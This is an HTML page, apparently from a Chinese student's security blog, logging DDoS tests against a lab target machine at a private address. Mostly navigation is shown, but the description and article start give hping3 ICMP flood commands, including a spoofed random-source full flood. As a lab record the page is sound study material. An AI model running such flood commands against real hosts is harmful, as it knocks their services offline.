+    <meta property="article:modified_time" content="2026-04-15T00:00:00+00:00">
+
+
+  <meta itemprop="name" content="DDos攻击测试日志">
+  <meta itemprop="description" content="2026.04.03 DDos攻击测试记录## 流量检测手段： sudo apt update &amp;&amp; sudo apt install nload nload eth0 ip -s -s link show eth0 watch -n 1 -d &#34;ip -s link show eth0&#34;一、ICMP DDos攻击#16:20~16:22
+# 【低等级】不伪造源，约发 3000 pps。 16:20 sudo hping3 --icmp -c 100000 -d 64 -i u400 172.31.132.2 # 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21 sudo hping3 --icmp -c 100000 -d 64 -i u150 --rand-source 172.31.132.2 # 【强等级】伪造源IP，极限泛洪。 16：22 sudo timeout 8s hping3 --icmp -d 64 --flood --rand-source 172.31.132.2二、UDP DDos攻击#16:23~16:25">
+  <meta itemprop="datePublished" content="2026-04-15T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-15T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1279">
+
+<title>DDos攻击测试日志 | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.16385c4434a1482ed0003b37376b99c8fbc7cd5a048ac3c57bdc51900a0cdc7a.js" integrity="sha256-FjhcRDShSC7QADs3N2uZyPvHzVoEisPFe9xRkAoM3Ho=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  <script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      processEscapes: true,
+      processEnvironments: true
+    },
+    options: {
+      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c860f18c28389564163849da32ed5d14" class="toggle"  />
+    <label for="section-c860f18c28389564163849da32ed5d14" class="flex">
+      <a role="button" class="">
+        Project</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/project/vigil/" class="">
+      vigil</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/project/vigil_t/" class="">
+      vigil</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/project/vigil-abandoned-version/" class="">
+      vigil(abandoned version)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8d58ff5c5e366ab14339daed9d222b7f" class="toggle" checked />
+    <label for="section-8d58ff5c5e366ab14339daed9d222b7f" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad627e53d6d1828a1435a85961eea27f" class="toggle" checked />
+    <label for="section-ad627e53d6d1828a1435a85961eea27f" class="flex">
+      <a role="button" class="">
+        xnwlaqbc靶机记录</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/" class="">
+      xnwlaqbc靶机部署与攻击</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/" class="active">
+      DDos攻击测试日志</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-20b418ba6aa317c76a5b35dea36ccbca" class="toggle"  />
+    <label for="section-20b418ba6aa317c76a5b35dea36ccbca" class="flex">
+      <a href="/docs/cybersecurity/DVWA/" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/" class="">
+      dvwa初始化修复</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Authorisation-Bypass/" class="">
+      Authorisation Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/CSRF/" class="">
+      CSRF</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Open-HTTP-Redirect/" class="">
+      Open HTTP Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/API/" class="">
+      api</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/CSP-Bypass/" class="">
+      CSP Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Cyptography/" class="">
+      Cryptography</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Command-Injection/" class="">
+      Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/File-Inclusion/" class="">
+      File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/SQL-Injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/" class="">
+      kali_linux基操</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-aa6f3e63fd33f2e9fa1487b55c3551ba" class="toggle"  />
+    <label for="section-aa6f3e63fd33f2e9fa1487b55c3551ba" class="flex">
+      <a role="button" class="">
+        SRC</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/SRC/%E8%81%94%E6%83%B3/" class="">
+      漏洞盒子：联想集团安全应急响应中心</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/SRC/stepfun/" class="">
+      漏洞盒子：阶跃星辰安全应急响应中心</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4ae5ffa90962cdf2660fe74526a01436" class="toggle"  />
+    <label for="section-4ae5ffa90962cdf2660fe74526a01436" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
+      log4j2.8.1漏洞复现</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e003e03c1feb2b65c7b35f539ae39c73" class="toggle"  />
+    <label for="section-e003e03c1feb2b65c7b35f539ae39c73" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="toggle"  />
+    <label for="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_drippingblues/" class="">
+      drippingblues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/" class="">
+      doubletrouble: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad44293ee93b1d26cf7c58190e7d4815" class="toggle"  />
+    <label for="section-ad44293ee93b1d26cf7c58190e7d4815" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/" class="">
+      Corrosion: 2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/" class="">
+      Thales</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fb378fb748ece0ae1fdeedef24da3db6" class="toggle"  />
+    <label for="section-fb378fb748ece0ae1fdeedef24da3db6" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/hard/vulnhub_Matrix-Breakout_-2_Morpheus/" class="">
+      Matrix-Breakout: 2 Morpheus</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="toggle"  />
+    <label for="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-7a6315a3240f7682f305097cdf53ea82" class="toggle"  />
+    <label for="section-7a6315a3240f7682f305097cdf53ea82" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f08add9f101710f9ba3d484a35d5581b" class="toggle"  />
+    <label for="section-f08add9f101710f9ba3d484a35d5581b" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1fdf586d1ea5885edf0672ce206f530c" class="toggle"  />
+    <label for="section-1fdf586d1ea5885edf0672ce206f530c" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-94ed7c835fd2d66c69e86ff967d092f9" class="toggle"  />
+    <label for="section-94ed7c835fd2d66c69e86ff967d092f9" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8EBERT-CNN%E7%9A%84Webshell%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="">
+      基于 BERT-CNN 的 Webshell 流量检测系统设计与实现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%8F%E5%88%97%E7%9A%84%E6%81%B6%E6%84%8F%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于可变长序列的恶意加密流量检测方法</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/" class="">
+      加密流量基础</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/" class="">
+      数据集分析</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="toggle"  />
+    <label for="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="flex">
+      <a role="button" class="">
+        工作</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/" class="">
+      AI安全思考</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c262361fe9aa48cd5d939ca8724680d" class="toggle"  />
+    <label for="section-2c262361fe9aa48cd5d939ca8724680d" class="flex">
+      <a role="button" class="">
+        leetcode</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c1a97b113c65b26353860b399a4f8855" class="toggle"  />
+    <label for="section-c1a97b113c65b26353860b399a4f8855" class="flex">
+      <a role="button" class="">
+        哈希</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/" class="">
+      1.两数之和</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/" class="">
+      实习简历</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8ebb29a2ddfb039e11169448c9cf3620" class="toggle"  />
+    <label for="section-8ebb29a2ddfb039e11169448c9cf3620" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      git使用指南</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/Hugo%E6%9E%B6%E6%9E%84%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/" class="">
+      Hugo架构网站搭建指南</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/linux_clash%E9%83%A8%E7%BD%B2/" class="">
+      linux clash部署</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/" class="">
+      pyenv管理python版本</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega_mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win&#43;r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win&#43;r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/" class="">
+      windows终端/git 走代理</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali_linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d096fa83268a84183f67ef634318f12c" class="toggle"  />
+    <label for="section-d096fa83268a84183f67ef634318f12c" class="flex">
+      <a href="/docs/AI/" class="">
+        AI</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/AI/claude-code-cli/" class="">
+      claude code cli</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/" class="">
+      主流AI定价</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-854542c26bded6389f67b522f4182c5e" class="toggle"  />
+    <label for="section-854542c26bded6389f67b522f4182c5e" class="flex">
+      <a role="button" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E7%BD%91%E5%AE%89/" class="">
+      网安</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E5%9D%9B/" class="">
+      论坛</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>DDos攻击测试日志</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#20260403-ddos攻击测试记录">2026.04.03 DDos攻击测试记录</a>
+      <ul>
+        <li><a href="#一icmp-ddos攻击">一、ICMP DDos攻击</a></li>
+        <li><a href="#二udp-ddos攻击">二、UDP DDos攻击</a></li>
+        <li><a href="#三tcp-syn-ddos攻击">三、TCP Syn DDos攻击</a></li>
+        <li><a href="#四思路调试">四、思路调试</a></li>
+      </ul>
+    </li>
+    <li><a href="#410思路">4.10思路</a></li>
+    <li><a href="#单ip攻击">单ip攻击</a></li>
+    <li><a href="#随机源ip攻击">随机源ip攻击</a></li>
+    <li><a href="#udp组攻击一三组-d速度统一u100-">UDP组攻击一：三组-d，速度统一，u100 =</a></li>
+    <li><a href="#udp组攻击二极限速度">UDP组攻击二：极限速度</a></li>
+    <li><a href="#udp组攻击三单ip攻击">UDP组攻击三：单IP攻击</a>
+      <ul>
+        <li><a href="#二慢dos桥接防火墙关闭失败">二、慢dos（桥接+防火墙关闭）（失败）</a></li>
+      </ul>
+    </li>
+    <li><a href="#414慢速ddos">4.14慢速Ddos</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="20260403-ddos攻击测试记录">2026.04.03 DDos攻击测试记录<a class="anchor" href="#20260403-ddos%e6%94%bb%e5%87%bb%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span><span style="color:#78787e"># 流量检测手段：</span>
+</span></span><span style="display:flex;"><span>sudo apt update <span style="color:#ff6ac1">&amp;&amp;</span> sudo apt install nload
+</span></span><span style="display:flex;"><span>nload eth0
+</span></span><span style="display:flex;"><span>ip -s -s link show eth0
+</span></span><span style="display:flex;"><span>watch -n <span style="color:#ff9f43">1</span> -d <span style="color:#5af78e">&#34;ip -s link show eth0&#34;</span></span></span></code></pre></div><h2 id="一icmp-ddos攻击">一、ICMP DDos攻击<a class="anchor" href="#%e4%b8%80icmp-ddos%e6%94%bb%e5%87%bb">#</a></h2>
+<p><code>16:20</code>~<code>16:22</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span><span style="color:#78787e"># 【低等级】不伪造源，约发 3000 pps。 16:20</span>
+</span></span><span style="display:flex;"><span>sudo hping3 --icmp -c <span style="color:#ff9f43">100000</span> -d <span style="color:#ff9f43">64</span> -i u400 172.31.132.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21</span>
